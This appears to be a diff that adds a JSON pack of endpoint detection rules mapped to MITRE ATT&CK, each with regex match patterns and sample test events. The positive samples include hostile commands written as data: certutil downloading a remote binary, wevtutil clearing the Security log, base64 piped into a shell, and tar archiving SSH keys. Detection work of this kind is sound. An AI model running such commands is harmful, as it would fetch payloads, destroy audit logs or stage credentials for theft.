@@ -1,0 +1,276 @@
+{
+  "pack": "seed",
+  "rules": [
+    {
+      "id": "linux-ld-preload-from-writable-dir",
+      "name": "LD_PRELOAD pointing into a world-writable directory",
+      "description": "A command sets LD_PRELOAD to a library under /tmp, /var/tmp or /dev/shm, which is how userland rootkits and hooks are commonly staged.",
+      "tactic": "Persistence",
+      "technique": "T1574.006",
+      "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+      "severity": "high",
+      "os": "linux",
+      "event_type": "process",
+      "match": { "field": "command", "op": "regex", "pattern": "ld_preload=\\S*(/tmp/|/var/tmp/|/dev/shm/)" },
+      "tags": ["linux", "rootkit", "userland"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "/usr/bin/env", "command": "env LD_PRELOAD=/dev/shm/.hook.so /usr/bin/id" },
+          { "executable": "/bin/bash", "command": "bash -c LD_PRELOAD=/tmp/libx.so ls" }
+        ],
+        "negative": [
+          { "executable": "/usr/bin/env", "command": "env LD_LIBRARY_PATH=/opt/app/lib ./app" },
+          { "executable": "/usr/bin/env", "command": "env LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 redis-server" }
+        ]
+      }
+    },
+    {
+      "id": "linux-authorized-keys-modified",
+      "name": "SSH authorized_keys created or modified",
+      "description": "An authorized_keys file was created or changed, which can grant a standing remote login to an attacker-controlled key.",
+      "tactic": "Persistence",
+      "technique": "T1098.004",
+      "technique_name": "Account Manipulation: SSH Authorized Keys",
+      "severity": "medium",
+      "os": "linux",
+      "event_type": "file",
+      "match": {
+        "all": [
+          { "field": "path", "op": "regex", "pattern": "/\\.ssh/authorized_keys2?$" },
+          { "field": "operation", "op": "in", "patterns": ["create", "modify"] }
+        ]
+      },
+      "tags": ["ssh", "linux"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "path": "/home/dev/.ssh/authorized_keys", "operation": "modify" },
+          { "path": "/root/.ssh/authorized_keys2", "operation": "create" }
+        ],
+        "negative": [
+          { "path": "/home/dev/.ssh/known_hosts", "operation": "modify" },
+          { "path": "/home/dev/.ssh/authorized_keys", "operation": "delete" }
+        ]
+      }
+    },
+    {
+      "id": "macos-launchagent-plist-created",
+      "name": "New LaunchAgent property list",
+      "description": "A property list appeared in a LaunchAgents directory, a common macOS user-level persistence location.",
+      "tactic": "Persistence",
+      "technique": "T1543.001",
+      "technique_name": "Create or Modify System Process: Launch Agent",
+      "severity": "medium",
+      "os": "macos",
+      "event_type": "file",
+      "match": {
+        "all": [
+          { "field": "path", "op": "regex", "pattern": "/library/launchagents/[^/]+\\.plist$" },
+          { "field": "operation", "op": "equals", "pattern": "create" }
+        ]
+      },
+      "tags": ["macos", "launchd"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "path": "/Users/ann/Library/LaunchAgents/com.update.helper.plist", "operation": "create" },
+          { "path": "/Library/LaunchAgents/com.vendor.sync.plist", "operation": "create" }
+        ],
+        "negative": [
+          { "path": "/Users/ann/Library/Preferences/com.apple.finder.plist", "operation": "create" },
+          { "path": "/Users/ann/Library/LaunchAgents/com.update.helper.plist", "operation": "delete" }
+        ]
+      }
+    },
+    {
+      "id": "macos-osascript-password-prompt",
+      "name": "osascript displaying a hidden-answer password dialog",
+      "description": "osascript was asked to show a dialog with a hidden answer or a password prompt, a pattern used to phish credentials from a logged-in user.",
+      "tactic": "Credential Access",
+      "technique": "T1056.002",
+      "technique_name": "Input Capture: GUI Input Capture",
+      "severity": "high",
+      "os": "macos",
+      "event_type": "process",
+      "match": {
+        "all": [
+          { "field": "executable", "op": "suffix", "pattern": "/osascript" },
+          { "field": "command", "op": "contains", "pattern": "display dialog" },
+          { "field": "command", "op": "contains", "patterns": ["hidden answer", "password"] }
+        ]
+      },
+      "tags": ["macos", "phishing", "applescript"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "/usr/bin/osascript", "command": "osascript -e display dialog \"Enter your password\" default answer \"\" with hidden answer" },
+          { "executable": "/usr/bin/osascript", "command": "osascript -e display dialog \"System needs your password to continue\"" }
+        ],
+        "negative": [
+          { "executable": "/usr/bin/osascript", "command": "osascript -e display dialog \"Build finished\" buttons {\"OK\"}" },
+          { "executable": "/usr/bin/open", "command": "open -a Safari password-manager-help.html" }
+        ]
+      }
+    },
+    {
+      "id": "windows-certutil-urlcache-fetch",
+      "name": "certutil used to fetch a remote file",
+      "description": "certutil.exe was invoked with the urlcache switch, which downloads arbitrary content from a URL and is rarely used by administrators for that.",
+      "tactic": "Command and Control",
+      "technique": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "severity": "high",
+      "os": "windows",
+      "event_type": "process",
+      "match": {
+        "all": [
+          { "field": "executable", "op": "suffix", "pattern": "\\certutil.exe" },
+          { "field": "command", "op": "regex", "pattern": "[-/]urlcache" }
+        ]
+      },
+      "tags": ["windows", "lolbin"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "C:\\Windows\\System32\\certutil.exe", "command": "certutil.exe -urlcache -split -f http://198.51.100.9/a.bin a.bin" },
+          { "executable": "C:\\Windows\\System32\\certutil.exe", "command": "certutil /urlcache /f https://example.invalid/x x.exe" }
+        ],
+        "negative": [
+          { "executable": "C:\\Windows\\System32\\certutil.exe", "command": "certutil -hashfile report.pdf SHA256" },
+          { "executable": "C:\\Windows\\System32\\curl.exe", "command": "curl -urlcache-is-not-a-flag https://example.com" }
+        ]
+      }
+    },
+    {
+      "id": "windows-event-log-cleared-wevtutil",
+      "name": "Windows event log cleared with wevtutil",
+      "description": "wevtutil.exe was run with the clear-log verb, erasing a log that would otherwise record recent activity.",
+      "tactic": "Defense Evasion",
+      "technique": "T1070.001",
+      "technique_name": "Indicator Removal: Clear Windows Event Logs",
+      "severity": "high",
+      "os": "windows",
+      "event_type": "process",
+      "match": {
+        "all": [
+          { "field": "executable", "op": "suffix", "pattern": "\\wevtutil.exe" },
+          { "field": "command", "op": "regex", "pattern": "(^|\\s)(cl|clear-log)(\\s|$)" }
+        ]
+      },
+      "tags": ["windows", "anti-forensics"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "C:\\Windows\\System32\\wevtutil.exe", "command": "wevtutil cl Security" },
+          { "executable": "C:\\Windows\\System32\\wevtutil.exe", "command": "wevtutil.exe clear-log System" }
+        ],
+        "negative": [
+          { "executable": "C:\\Windows\\System32\\wevtutil.exe", "command": "wevtutil qe Security /c:5" },
+          { "executable": "C:\\Windows\\System32\\wevtutil.exe", "command": "wevtutil el" }
+        ]
+      }
+    },
+    {
+      "id": "linux-base64-decode-into-shell",
+      "name": "Base64-decoded content piped into a shell",
+      "description": "A command decodes base64 and feeds the result straight into a shell, hiding the real payload from command-line logging.",
+      "tactic": "Execution",
+      "technique": "T1059.004",
+      "technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "severity": "high",
+      "os": "linux",
+      "event_type": "process",
+      "match": { "field": "command", "op": "regex", "pattern": "base64\\s+(-d|--decode)\\b[^|;]*\\|\\s*(/\\S*/)?(ba|da|z)?sh\\b" },
+      "tags": ["obfuscation", "linux"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "/bin/bash", "command": "bash -c echo cGF5bG9hZA== | base64 -d | sh" },
+          { "executable": "/bin/sh", "command": "sh -c cat blob.txt | base64 --decode | /bin/bash" }
+        ],
+        "negative": [
+          { "executable": "/usr/bin/base64", "command": "base64 -d notes.b64 > notes.txt" },
+          { "executable": "/bin/bash", "command": "bash -c echo hello | base64" }
+        ]
+      }
+    },
+    {
+      "id": "any-tor-onion-service-contact",
+      "name": "Connection to a Tor onion service",
+      "description": "A host opened a connection to a .onion destination, which is unusual outside anonymity tooling and can indicate hidden command-and-control.",
+      "tactic": "Command and Control",
+      "technique": "T1090.003",
+      "technique_name": "Proxy: Multi-hop Proxy",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "network",
+      "match": { "field": "destination", "op": "regex", "pattern": "\\.onion(:\\d+)?$" },
+      "tags": ["tor", "anonymization"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "destination": "exampleexampleexample.onion:80" },
+          { "destination": "abcdefghijklmnop.onion" }
+        ],
+        "negative": [
+          { "destination": "example.com:443" },
+          { "destination": "onion-recipes.example:443" }
+        ]
+      }
+    },
+    {
+      "id": "unix-archive-of-credential-stores",
+      "name": "Credential directories archived with tar, zip or 7z",
+      "description": "An archiving utility was pointed at SSH keys, cloud credentials or kubeconfig, which usually precedes staging for exfiltration.",
+      "tactic": "Collection",
+      "technique": "T1560.001",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          { "field": "executable", "op": "regex", "pattern": "/(tar|zip|7z|7za)$" },
+          { "field": "command", "op": "regex", "pattern": "(\\.ssh|\\.aws/credentials|\\.kube/config|\\.gnupg)" }
+        ]
+      },
+      "tags": ["staging", "credentials"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "executable": "/usr/bin/tar", "command": "tar czf /tmp/k.tgz /home/dev/.ssh" },
+          { "executable": "/usr/bin/zip", "command": "zip -r out.zip .aws/credentials .kube/config" }
+        ],
+        "negative": [
+          { "executable": "/usr/bin/tar", "command": "tar czf backup.tgz /var/www/site" },
+          { "executable": "/usr/bin/ls", "command": "ls -la /home/dev/.ssh" }
+        ]
+      }
+    },
+    {
+      "id": "windows-run-key-value-added",
+      "name": "Run or RunOnce registry autostart value added",
+      "description": "A value was written under a Run or RunOnce registry key, which executes a program at every logon. Pending registry telemetry from the sensor.",
+      "tactic": "Persistence",
+      "technique": "T1547.001",
+      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys",
+      "severity": "medium",
+      "os": "windows",
+      "event_type": "registry",
+      "match": { "field": "path", "op": "regex", "pattern": "\\\\currentversion\\\\run(once)?(\\\\|$)" },
+      "tags": ["windows", "autostart"],
+      "batch": "seed-v1",
+      "tests": {
+        "positive": [
+          { "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater" },
+          { "path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" }
+        ],
+        "negative": [
+          { "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced" },
+          { "path": "HKLM\\Software\\Vendor\\RunnerSettings" }
+        ]
+      }
+    }
+  ]
+}
